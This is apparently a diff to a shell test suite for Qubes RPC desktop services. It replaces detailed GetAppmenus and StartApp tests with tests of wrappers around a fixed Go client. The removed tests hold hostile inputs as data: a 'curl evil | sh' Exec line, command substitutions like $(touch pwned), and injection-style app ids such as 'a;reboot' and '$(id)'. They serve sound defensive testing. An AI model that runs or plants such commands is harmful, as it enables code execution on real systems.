@@ -1005,303 +1005,61 @@ t_remoteendpoints_large_answer() {
 }
 
 # =====================================================================================
-# remote/qubes-rpc/qubes.GetAppmenus — menu entries for dom0's qvm-sync-appmenus.
+# Desktop wrappers delegate only to the fixed bounded Go client. Parsing,
+# peer credentials and output limits are exercised in internal/desktop and the
+# real GIO/container suite; the wrappers own argv, stdin and status propagation.
 # =====================================================================================
-APPS='usr/share/applications'
-
-menus_setup() {
-    install_svc remote/qubes-rpc/qubes.GetAppmenus \
-        "/usr/share/applications=$CUR/root/usr/share/applications" \
-        "/usr/local/share/applications=$CUR/root/usr/local/share/applications" \
-        "/home/*=$CUR/root/home/*"
+desktop_setup() {
+    install_svc "$1" "/usr/bin/qubes-air-desktop=$CUR/abs/qubes-air-desktop"
+    stub_abs qubes-air-desktop
 }
 
-menus_run() { run_svc QREXEC_REMOTE_DOMAIN=dom0 -- "$SVC" "$@"; }
-
-expect_sorted_stdout() {
-    local got
-    got="$(LC_ALL=C sort "$C/stdout")"
-    [ "$got" = "$1" ] || fail "menu lines (sorted):
-      want: $(printf '%s' "$1" | sed '2,$s/^/            /')
-      got:  $(printf '%s' "$got" | sed '2,$s/^/            /')"
-}
-
-CALC=$'[Desktop Entry]\nType=Application\nName=Calculator\nExec=gnome-calculator %U\nIcon=org.gnome.Calculator\n\n[Desktop Action new-window]\nName=New Window\nExec=gnome-calculator --new-window\n'
-CALC_LINES='org.gnome.Calculator.desktop:Type=Application
-org.gnome.Calculator.desktop:Name=Calculator
-org.gnome.Calculator.desktop:Exec=qubes-desktop-run org.gnome.Calculator.desktop
-org.gnome.Calculator.desktop:Icon=org.gnome.Calculator'
-
-t_getappmenus_empty_system() {
-    case_begin "GetAppmenus: no application directories is an empty menu" || return 0
-    menus_setup
-    menus_run
-    expect_rc 0
-    expect_stdout_empty
-    expect_no_calls
-    case_end
-}
-
-t_getappmenus_entry() {
-    case_begin "GetAppmenus: emits the Desktop Entry with Exec rewritten to qubes-desktop-run" || return 0
-    menus_setup
-    put "$C/root/$APPS/org.gnome.Calculator.desktop" "$CALC"
-    menus_run
-    expect_rc 0
-    expect_stdout "$CALC_LINES"
-    expect_stdout_lacks 'gnome-calculator'
-    case_end
-}
-
-t_getappmenus_hidden_entries() {
-    case_begin "GetAppmenus: NoDisplay and Screensaver entries are dropped whole" || return 0
-    menus_setup
-    put "$C/root/$APPS/nodisplay.desktop" $'[Desktop Entry]\nName=Hidden\nExec=x\nNoDisplay=true\n'
-    put "$C/root/$APPS/spaced.desktop" $'[Desktop Entry]\nName=Hidden2\nNoDisplay = true \n'
-    put "$C/root/$APPS/saver.desktop" $'[Desktop Entry]\nName=Saver\nCategories=Screensaver;X-Foo;\n'
-    put "$C/root/$APPS/shown.desktop" $'[Desktop Entry]\nName=Shown\nNoDisplay=false\n'
-    menus_run
-    expect_rc 0
-    expect_stdout 'shown.desktop:Name=Shown'
-    case_end
-}
-
-t_getappmenus_layout() {
-    case_begin "GetAppmenus: user, nested, spaced and non-desktop files map to menu ids" || return 0
-    menus_setup
-    put "$C/root/$APPS/kde/konsole.desktop" $'[Desktop Entry]\nName=Konsole\n'
-    put "$C/root/$APPS/My App.desktop" $'[Desktop Entry]\nName=Mine\n'
-    put "$C/root/$APPS/readme.txt" $'[Desktop Entry]\nName=NotAnApp\n'
-    mkdir -p "$C/root/$APPS/dir.desktop" "$C/root/home/bob"
-    put "$C/root/usr/local/share/applications/local.desktop" $'[Desktop Entry]\nName=Local\n'
-    put "$C/root/home/alice/.local/share/applications/alice.desktop" $'[Desktop Entry]\nName=Alice\n'
-    menus_run
-    expect_rc 0
-    expect_sorted_stdout 'My App.desktop:Name=Mine
-alice.desktop:Name=Alice
-kde-konsole.desktop:Name=Konsole
-local.desktop:Name=Local'
-    case_end
-}
-
-t_getappmenus_hostile_content() {
-    case_begin "GetAppmenus: hostile Exec and values are data, never executed or leaked" || return 0
-    menus_setup
-    put "$C/root/$APPS/evil.desktop" $'[Desktop Entry]\nName=$(touch pwned)`touch pwned2`\nExec=sh -c \'curl evil | sh\'\nComment=win\r\nX-Last=no-newline'
-    menus_run
-    expect_rc 0
-    expect_stdout $'evil.desktop:Name=$(touch pwned)`touch pwned2`\nevil.desktop:Exec=qubes-desktop-run evil.desktop\nevil.desktop:Comment=win\nevil.desktop:X-Last=no-newline'
-    expect_stdout_lacks 'curl'
-    if [ -e "$C/cwd/pwned" ] || [ -e "$C/cwd/pwned2" ]; then fail "a .desktop value was executed"; fi
-    case_end
-}
-
-t_getappmenus_ignores_caller_input() {
-    case_begin "GetAppmenus: service argument and 3 MiB of stdin are ignored" || return 0
-    menus_setup
-    put "$C/root/$APPS/org.gnome.Calculator.desktop" "$CALC"
-    cp "$BLOB" "$C/stdin"
-    menus_run '../../../etc'
-    expect_rc 0
-    expect_stdout "$CALC_LINES"
-    case_end
-}
-
-t_getappmenus_unreadable() {
-    # Permission bits do not bind root, so this case only means something unprivileged.
-    [ "$(id -u)" -ne 0 ] || return 0
-    case_begin "GetAppmenus: unreadable files and directories are skipped, exit stays 0" || return 0
-    menus_setup
-    put "$C/root/$APPS/ok.desktop" $'[Desktop Entry]\nName=Ok\n'
-    put "$C/root/$APPS/secret.desktop" $'[Desktop Entry]\nName=Secret\n'
-    put "$C/root/$APPS/locked/inner.desktop" $'[Desktop Entry]\nName=Inner\n'
-    chmod 000 "$C/root/$APPS/secret.desktop" "$C/root/$APPS/locked"
-    menus_run
-    chmod 755 "$C/root/$APPS/locked"
-    chmod 644 "$C/root/$APPS/secret.desktop"
-    expect_rc 0
-    expect_stdout 'ok.desktop:Name=Ok'
-    case_end
-}
-
-t_getappmenus_large_output() {
-    local i=0 big
-    case_begin "GetAppmenus: 200 entries and a 256 KiB value are emitted in full" || return 0
-    menus_setup
-    while [ "$i" -lt 200 ]; do
-        put "$C/root/$APPS/app$i.desktop" $'[Desktop Entry]\nExec=run\n'
-        i=$((i + 1))
-    done
-    big="$(long_string x 262144)"
-    put "$C/root/$APPS/big.desktop" $'[Desktop Entry]\nComment='"$big"$'\n'
-    menus_run
-    expect_rc 0
-    [ "$(grep -c ':Exec=qubes-desktop-run app' "$C/stdout")" -eq 200 ] || fail "want 200 Exec lines"
-    printf 'big.desktop:Comment=%s\n' "$big" >"$C/want-big"
-    grep '^big.desktop:' "$C/stdout" >"$C/got-big"
-    cmp -s "$C/want-big" "$C/got-big" || fail "the 256 KiB Comment was not emitted intact"
-    case_end
-}
-
-# =====================================================================================
-# remote/qubes-rpc/qubes.StartApp — launch an app id on the Xpra display.
-# =====================================================================================
-make_stub passwd getent <<'EOF'
-[ "$1" = passwd ] || exit 2
-awk -F: -v k="$2" '$1 == k || $3 == k { print; found = 1 } END { exit (found ? 0 : 2) }' "$C/passwd"
-EOF
-make_stub passwd id <<'EOF'
-[ "$1" = -u ] || exit 1
-awk -F: -v k="$2" '$1 == k { print $3; found = 1 } END { exit (found ? 0 : 1) }' "$C/passwd"
-EOF
-
-start_setup() {
-    install_svc remote/qubes-rpc/qubes.StartApp
-    put "$C/passwd" $'root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000:Alice:/home/alice:/bin/bash\n'
-    link_stub passwd getent
-    link_stub passwd id
-    stub systemd-run
-    stub runuser
-}
-
-start_calls() { # APP: the full command sequence of a systemd launch
-    printf 'getent [passwd] [1000]\n'
-    printf 'systemd-run [--collect] [--quiet] [--property=Type=exec] [--uid=alice] [--setenv=HOME=/home/alice] [--setenv=DISPLAY=:100] [--setenv=XDG_RUNTIME_DIR=/run/user/1000] [--] [qubes-desktop-run] [%s]' "$1"
-}
-
-t_startapp_missing_id() {
-    local arg
-    for arg in '' '<none>'; do
-        case_begin "StartApp: missing app id ($arg) is a nonzero failure" || continue
-        start_setup
-        if [ "$arg" = '<none>' ]; then run_svc -- "$SVC"; else run_svc -- "$SVC" "$arg"; fi
-        expect_rc 64
-        expect_stdout_empty
-        expect_stderr 'qubes.StartApp: expected one valid app id'
-        expect_no_calls
-        case_end
-    done
-}
-
-t_startapp_illegal_id() {
-    local app
-    for app in 'a b' 'a;reboot' '../../usr/bin/id' 'a/b' '$(id)' '`id`' $'a\nb' 'a|b' 'a&b' \
-        '*' "a'b" 'a"b' 'a\b' 'gedit%U' 'a>b' '.' '..' 'a..b' 'é' "$(long_string a 114)" "$(long_string a 4096)"; do
-        case_begin "StartApp: invalid app id '${app:0:40}' is refused before lookup" || continue
-        start_setup
-        run_svc -- "$SVC" "$app"
-        expect_rc 64
-        expect_stdout_empty
-        expect_stderr 'qubes.StartApp: expected one valid app id'
-        expect_no_calls
-        case_end
-    done
-}
-
-t_startapp_extra_argument() {
-    case_begin "StartApp: more than one argument launches nothing" || return 0
-    start_setup
-    run_svc -- "$SVC" gedit extra
-    expect_rc 64
-    expect_stdout_empty
-    expect_stderr 'qubes.StartApp: expected one valid app id'
-    expect_no_calls
-    case_end
-}
-
-# The full service name is 15 prefix bytes plus at most 113 app-id bytes.
-t_startapp_launches() {
-    local app
-    for app in org.gnome.Calculator org.kde.konsole.desktop 'a_b-c+d' '-h' "$(long_string a 113)"; do
-        case_begin "StartApp: '${app:0:40}' launches with no caller stdin or helper output" || continue
-        start_setup
+t_desktop_wrappers() {
+    local path operation
+    for path in remote/qubes-rpc/qubes.GetAppmenus remote/qubes-rpc/qubes.StartApp remote/bin/qubes-desktop-run; do
+        operation=launch
+        [ "${path##*/}" != qubes.GetAppmenus ] || operation=menus
+        case_begin "desktop wrapper ${path##*/}: fixed client and disconnected stdin" || continue
+        desktop_setup "$path"
         cp "$BLOB" "$C/stdin"
-        put "$C/ctl/systemd-run.capture-stdin" ''
-        put "$C/ctl/systemd-run.stdout" 'launcher diagnostic'
-        run_svc -- "$SVC" "$app"
+        put "$C/ctl/qubes-air-desktop.capture-stdin" ''
+        put "$C/ctl/qubes-air-desktop.stdout" 'validated broker reply'
+        run_svc -- "$SVC" '-h' 'extra argument'
         expect_rc 0
-        expect_stdout "qubes.StartApp: launched '$app' on :100"
-        expect_calls "$(start_calls "$app")"
-        [ ! -s "$C/got/systemd-run.stdin" ] || fail "launcher inherited caller stdin"
+        expect_stdout 'validated broker reply'
+        expect_calls "qubes-air-desktop [$operation] [-h] [extra argument]"
+        [ ! -s "$C/got/qubes-air-desktop.stdin" ] || fail "client inherited caller payload"
         case_end
     done
 }
 
-t_startapp_launch_failure() {
-    case_begin "StartApp: failed launch returns nonzero and no stdout" || return 0
-    start_setup
-    put "$C/ctl/systemd-run.rc" 1
-    put "$C/ctl/systemd-run.stderr" 'launcher private diagnostic'
-    run_svc -- "$SVC" gedit
-    expect_rc 1
-    expect_stdout_empty
-    expect_stderr "qubes.StartApp: failed to launch 'gedit' on :100"
-    case_end
+t_desktop_wrapper_failures() {
+    local path code
+    for path in remote/qubes-rpc/qubes.GetAppmenus remote/qubes-rpc/qubes.StartApp remote/bin/qubes-desktop-run; do
+        for code in 64 69 70 75 77; do
+            case_begin "desktop wrapper ${path##*/}: preserves client failure $code" || continue
+            desktop_setup "$path"
+            put "$C/ctl/qubes-air-desktop.rc" "$code"
+            put "$C/ctl/qubes-air-desktop.stderr" 'bounded diagnostic'
+            run_svc -- "$SVC"
+            expect_rc "$code"
+            expect_stdout_empty
+            expect_stderr 'bounded diagnostic'
+            case_end
+        done
+    done
 }
 
-t_startapp_large_launcher_output() {
-    case_begin "StartApp: 1 MiB of failed launcher output is discarded" || return 0
-    start_setup
-    put "$C/ctl/systemd-run.rc" 1
-    long_string e 1048576 >"$C/ctl/systemd-run.stderr"
-    run_svc -- "$SVC" gedit
-    expect_rc 1
-    expect_stdout_empty
-    expect_stderr "qubes.StartApp: failed to launch 'gedit' on :100"
-    case_end
-}
-
-t_startapp_missing_account() {
-    case_begin "StartApp: missing uid 1000 does not fall back to another account" || return 0
-    start_setup
-    put "$C/passwd" $'root:x:0:0:root:/root:/bin/bash\nuser:x:1001:1001:User:/home/user:/bin/bash\n'
-    run_svc -- "$SVC" gedit
-    expect_rc 69
-    expect_stdout_empty
-    expect_stderr 'qubes.StartApp: desktop account is unavailable'
-    expect_calls 'getent [passwd] [1000]'
-    case_end
-}
-
-t_startapp_invalid_display() {
-    local display
-    for display in 'host:100' ':100 --help' $':100\n:101' ':100/' ':abc'; do
-        case_begin "StartApp: non-local or malformed display is refused" || continue
-        start_setup
-        run_svc QUBESAIR_XPRA_DISPLAY="$display" -- "$SVC" gedit
+t_desktop_missing_client() {
+    local path
+    for path in remote/qubes-rpc/qubes.GetAppmenus remote/qubes-rpc/qubes.StartApp remote/bin/qubes-desktop-run; do
+        case_begin "desktop wrapper ${path##*/}: unavailable fixed client fails closed" || continue
+        desktop_setup "$path"
+        rm "$C/abs/qubes-air-desktop"
+        run_svc -- "$SVC" editor
         expect_rc 69
         expect_stdout_empty
-        expect_stderr 'qubes.StartApp: invalid desktop display'
         expect_no_calls
-        case_end
-    done
-}
-
-t_startapp_without_systemd() {
-    case_begin "StartApp: missing systemd-run does not try a sandboxed fallback" || return 0
-    start_setup
-    rm -f "$C/bin/systemd-run"
-    run_svc QUBESAIR_XPRA_DISPLAY=:101 -- "$SVC" gedit
-    expect_rc 69
-    expect_stdout_empty
-    expect_stderr 'qubes.StartApp: desktop launcher is unavailable'
-    expect_no_calls
-    case_end
-}
-
-t_startapp_invalid_account() {
-    local entry
-    for entry in 'bad user:x:1000:1000:User:/home/user:/bin/bash' \
-        'alice:x:1000:1000:User:relative:/bin/bash' \
-        'alice:x:1000:1000:User:/home/../root:/bin/bash'; do
-        case_begin 'StartApp: malformed desktop account refuses the launch' || continue
-        start_setup
-        put "$C/passwd" "$entry"$'\n'
-        run_svc -- "$SVC" gedit
-        expect_rc 69
-        expect_stdout_empty
-        expect_stderr 'qubes.StartApp: desktop account is unavailable'
-        expect_calls 'getent [passwd] [1000]'
         case_end
     done
 }
